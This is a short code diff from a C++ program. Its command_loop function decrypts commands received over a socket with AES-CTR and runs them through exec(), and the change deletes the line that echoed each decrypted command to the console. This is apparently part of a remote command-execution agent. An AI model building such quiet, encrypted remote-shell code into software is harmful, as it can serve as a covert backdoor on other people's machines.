@@ -173,7 +173,6 @@ void command_loop(int new_sockfd, std::string symmetric_key){
         }
 
         std::string dec_command = aes_ctr(std::string(enc_command.begin(), enc_command.end()), symmetric_key, iv);
-        std::cout << dec_command << std::endl;
 
         std::string result = exec(dec_command.c_str());
 
